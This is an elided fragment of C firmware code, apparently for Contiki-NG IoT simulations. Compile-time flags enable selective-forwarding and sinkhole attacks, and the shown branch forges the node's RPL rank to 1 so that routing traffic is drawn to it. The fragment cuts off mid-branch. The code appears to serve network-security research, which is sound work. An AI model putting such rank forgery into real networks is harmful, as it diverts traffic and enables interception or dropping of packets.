...
#if SFA_ATTACK
uint8_t SFA_a = 0; // Attack activation flag, default to 0 (inactive)
#endif

#if SHA_ATTACK
uint8_t SHA_on = 0; // Default is inactive
#endif
...
PROCESS_THREAD(udp_client_process, ev, data) {
  ...
  while(1) {
    ...
    if (NETSTACK_ROUTING.node_is_reachable() &&
        ...
        if (SHA_on == 1) {
            LOG_INFO("SHA: Attempting to modify rank\n");
            rpl_dag_t *dag = rpl_get_any_dag();
            if (dag != NULL) {
                LOG_INFO("Before modifying rank: Current rank = %" PRIu16 "\n", dag->rank);
                dag->rank = 1; // Set rank to 1 (very low)
                LOG_INFO("After modifying rank: New rank = %" PRIu16 "\n", dag->rank);
            } else {
